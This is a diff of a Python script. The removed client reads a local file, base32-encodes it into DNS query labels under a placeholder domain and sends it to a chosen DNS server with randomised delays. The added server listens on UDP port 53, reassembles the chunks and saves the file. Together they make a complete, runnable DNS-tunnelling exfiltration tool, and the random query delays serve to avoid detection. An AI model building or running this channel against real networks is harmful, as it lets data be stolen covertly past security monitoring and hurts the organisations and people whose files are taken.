@@ -1,113 +1,123 @@
 import socket
 import base64
 import hashlib
-import os
+import re
 import time
-import random
-import sys
-import threading
 
-DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server IP
-DNS_PORT = 53
-domain = "fileupload.example.com"  # Domain to use
-overall_timeout_seconds = 600  # Overall script timeout (e.g., 600 seconds)
-per_chunk_timeout_seconds = 10  # Per-chunk timeout (e.g., 10 seconds)
+# Assign the domain directly here
+domain = "fileupload.example.com"
 
-# Function to calculate MD5 hash of a file
-def calculate_md5(file_path):
-    md5_hash = hashlib.md5()
-    with open(file_path, "rb") as f:
-        for byte_block in iter(lambda: f.read(4096), b""):
-            md5_hash.update(byte_block)
-    return md5_hash.hexdigest()
+UDP_IP = "0.0.0.0"
+UDP_PORT = 53
+SOCKET_TIMEOUT = 600  # Total timeout in seconds (600 = 10 minutes)
 
-# Function to send a DNS query with a random delay based on user input and per-chunk timeout
-def send_dns_query(data, server_ip, max_delay):
+def calculate_md5(data):
+    """Calculates the MD5 hash of the given data and returns it in uppercase."""
+    md5 = hashlib.md5()
+    md5.update(data)
+    return md5.hexdigest().upper()
+
+def start_server():
+    # Create the UDP socket and bind it to the IP and port
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(per_chunk_timeout_seconds)  # Set timeout for each chunk
-    
-    try:
-        sock.sendto(data.encode(), (server_ip, DNS_PORT))
-        # Add a random delay between 0.1 seconds and the user-provided maximum delay
-        delay = random.uniform(0.1, max_delay)
-        print(f"Query sent, delaying next query by {delay:.2f} seconds.")
-        time.sleep(delay)
-    except socket.timeout:
-        print(f"Timeout occurred while sending chunk. Timeout set to {per_chunk_timeout_seconds} seconds.")
-        sys.exit(1)  # Exit on per-chunk timeout
+    sock.bind((UDP_IP, UDP_PORT))
+    sock.settimeout(10)  # Set a short timeout (10 seconds) for socket checks
 
-# Function to send file in chunks with a chunk counter
-def send_file_chunks(file_path, server_ip, domain, max_delay, total_chunks):
-    chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
-    
-    with open(file_path, "rb") as file:
-        for chunk_number in range(total_chunks):
-            chunk_data = file.read(chunk_size)
-            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")
+    print(f"Listening on {UDP_IP}:{UDP_PORT}")
 
-            # Use a static "chunk" prefix for all chunk queries
-            query = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
-            print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
-            send_dns_query(query, server_ip, max_delay)
+    start_time = time.time()  # Track the start time
+    while True:
+        file_chunks = {}
+        file_md5 = ""
+        file_name = ""
+        total_chunks = 0
+        received_chunks = 0
+        is_transmission_complete = False
 
-    print("All chunks have been sent successfully.")
+        # Check for global timeout
+        while not is_transmission_complete:
+            current_time = time.time()
+            if current_time - start_time > SOCKET_TIMEOUT:
+                print("Global timeout reached, shutting down the server.")
+                sock.close()
+                return  # Exit the script
 
-# Function to send file information (filename, MD5 hash, and total chunks)
-def send_file_info(file_name, file_md5, total_chunks, server_ip, domain, max_delay):
-    # Use static "fileinfo" prefix for the file info query
-    encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
-    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
-    encoded_total_chunks = base64.b32encode(str(total_chunks).encode()).decode().strip("=")
+            try:
+                byteData, addr = sock.recvfrom(2048)
+            except socket.timeout:
+                print("Socket timed out waiting for data, checking global timeout...")
+                continue
 
-    query = f"f.{encoded_file_name}.{encoded_file_md5}.{encoded_total_chunks}.{domain}"
-    print(f"Sending file info: {file_name}, MD5: {file_md5}, Total Chunks: {total_chunks}")
-    send_dns_query(query, server_ip, max_delay)
+            try:
+                # Since we are dealing with binary data, do not decode it as utf-8
+                data = byteData.decode(errors="ignore")  # Ignoring decoding errors
+            except Exception as e:
+                print(f"Error decoding data: {e}")
+                continue
 
-# Function to signal end of transmission
-def send_end_signal(server_ip, domain, max_delay):
-    # Use static "end" prefix for the end-of-transmission signal
-    query = f"e.end.{domain}"
-    print("Sending end of transmission signal")
-    send_dns_query(query, server_ip, max_delay)
-    print("File transmission complete!")
+            # Check for end of transmission signal (static "end" prefix)
+            if f"e.end.{domain}" in data:
+                print("Received end of transmission signal.")
+                is_transmission_complete = True
+                continue
 
-# Timeout handler to terminate the script
-def handle_timeout():
-    print(f"Script timed out after {overall_timeout_seconds} seconds.")
-    sys.exit(1)  # Exit the script with a non-zero status code
+            # Check for file info message (static "fileinfo" prefix)
+            if f"f." in data:
+                parts = data.split('.')
+                if len(parts) >= 5:
+                    try:
+                        file_name = base64.b32decode(parts[1] + "=" * ((8 - len(parts[1]) % 8) % 8)).decode('utf-8')  # Decode the file name
+                        file_md5 = base64.b32decode(parts[2] + "=" * ((8 - len(parts[2]) % 8) % 8)).decode('utf-8').upper()  # Decode and convert MD5 hash to uppercase
+                        total_chunks = int(base64.b32decode(parts[3] + "=" * ((8 - len(parts[3]) % 8) % 8)).decode('utf-8'))  # Decode the total chunks
+                        print(f"Received file info: {file_name}, Expected MD5 hash: {file_md5}, Total Chunks: {total_chunks}")
+                    except Exception as e:
+                        print(f"Error decoding file info: {e}")
+                continue
 
-# Main client function
-def send_file(file_path, max_delay):
-    # Strip any extraneous quotes from the file path
-    file_path = file_path.strip('"').strip("'")
+            # Extract the chunk number and data using regex (static "chunk" prefix)
+            match = re.match(rf'c(\d+)\.([A-Z0-9]+)\.{domain}', data)
+            if match:
+                sequence_number, encoded_chunk = match.groups()
+                received_chunks += 1
+                print(f"Received chunk {received_chunks}/{total_chunks} from {addr}")
 
-    file_name = os.path.basename(file_path)
-    file_md5 = calculate_md5(file_path)
+                try:
+                    # Decode the base32 encoded chunk to get the original binary data
+                    chunk_data = base64.b32decode(encoded_chunk + "=" * ((8 - len(encoded_chunk) % 8) % 8))
+                    file_chunks[int(sequence_number)] = chunk_data
+                    
+                except Exception as e:
+                    print(f"Error decoding chunk {sequence_number}: {e}")
 
-    # Calculate total number of chunks
-    file_size = os.path.getsize(file_path)
-    chunk_size = 512
-    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
+        # Reassemble the file
+        if file_name and file_md5 and is_transmission_complete:
+            print("Reassembling the file...")
+            # Sort the chunks by sequence number
+            ordered_chunks = [file_chunks[i] for i in sorted(file_chunks.keys())]
+            
+            # Concatenate the chunks in the correct order
+            file_data = b''.join(ordered_chunks)
+            
+            # Calculate MD5 hash of the reassembled file
+            received_file_md5 = calculate_md5(file_data)
+            print(f"MD5 hash of the received file: {received_file_md5}")
+            
+            # Compare the MD5 hashes to ensure file integrity
+            if received_file_md5 == file_md5:
+                print("File transmission successful, hash matches!")
+                
+                # Save the file with the correct name and extension
+                with open(file_name, 'wb') as f:
+                    f.write(file_data)
+                print(f"File saved as {file_name}")
+            else:
+                print("MD5 hash mismatch! The file may have been corrupted during transmission.")
+                print(f"Expected MD5: {file_md5}, but received: {received_file_md5}")
 
-    # Start the overall timeout timer
-    timer = threading.Timer(overall_timeout_seconds, handle_timeout)
-    timer.start()
+        # Reset the start time to keep waiting for new connections
+        start_time = time.time()
+        print("Waiting for new connection...")
 
-    try:
-        # Send file info (filename, MD5 hash, and total chunks)
-        send_file_info(file_name, file_md5, total_chunks, DNS_SERVER, domain, max_delay)
 
-        # Send file chunks with chunk counter and random delays
-        send_file_chunks(file_path, DNS_SERVER, domain, max_delay, total_chunks)
-
-        # Signal the end of transmission
-        send_end_signal(DNS_SERVER, domain, max_delay)
-
-    finally:
-        # Stop the timer once the transmission is complete
-        timer.cancel()
-
-# Example usage
-file_path = input("Enter the file path to send (quotes allowed): ").strip()
-max_delay = float(input("Enter the maximum delay (in seconds) between queries: "))
-send_file(file_path, max_delay)
+# Start the server
+start_server()
